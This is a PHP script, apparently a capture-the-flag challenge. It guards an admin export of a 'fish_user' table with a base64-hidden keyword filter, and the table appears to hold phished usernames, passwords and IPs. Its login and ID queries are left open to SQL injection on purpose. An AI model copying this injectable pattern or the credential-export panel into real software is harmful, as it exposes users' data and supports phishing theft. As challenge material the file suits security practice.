<?php
require_once '../include/common.php';
if($islogin==1){}else exit("<script language='javascript'>window.location.href='./login.php';</script>");
//只有用户bmth能做这些事,但我好像忘记了他的密码
$isBmth = 0;
function waf($param)
{
    $regex = base64_decode("LyhzZWxlY3R8ZnJvbXx3aGVyZXxqb2lufHNsZWVwfGFuZHxcc3x1bmlvbnwsKS9p");
    return preg_replace($regex,"",$param);
}
$user = $_POST['user'];
$pass = $_POST['pass'];
if(strlen(waf($user))!=strlen($user) or strlen(waf($pass))!=strlen($pass)){
    die("Forbideen!");
}
$sql = "select * from fish_admin where username='$user'";
$result = $DB->get_row("SELECT * FROM fish_admin WHERE username='$user' limit 1");
//var_dump($result);
if($result['username'] == 'bmth' and $result['password'] == $pass)
{
    echo("Welcome,Bmth!".PHP_EOL);
    $isBmth = 1;
}else{
    die("You're not Bmth!");
}
if($isBmth)
{
    if(isset($_GET['all'])){
        $sql="select * from fish_user;";
        $update="update fish_user set output=1;";
    }else{
        $zhi=$_GET['id'];
        if($zhi==''){
            exit('ID错误，请关闭窗口！');
        }
        $zhi = preg_replace("/union|null|concat|select|\s/i","",$zhi);
        $sql="select * from fish_user where id in('$zhi');";
        $update="update fish_user set output=1 where id in('$zhi');";
    }
    $filename=date("Y-m-d").'-Data.txt';//要导出的文件的文件名需要加上文件后缀
    header('Content-Type: text/x-sql');
    header('Expires: ' . gmdate('D, d M Y H:i:s') . ' GMT');
    header('Content-Disposition: attachment; filename="' .$filename. '"');
    $is_ie = 'IE';
    if ($is_ie == 'IE') {
        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
        header('Pragma: public');
    } else {
        header('Pragma: no-cache');
        header('Last-Modified: ' . gmdate('D, d M Y H:i:s') . ' GMT');
    }
    $data=$DB->query($sql);
    $DB->query($update);
    $date = date("Y-m-d H:i:s");
    echo $date." 导出的数据\r\n";
    while($row = $DB->fetch($data))
    {
        echo $row['username'] . "----" . $row['password'] . "----" . $row['ip'] . "----" . $row['address'] . "----" . $row['time'];
        echo "\r\n";
    }
    exit();
}

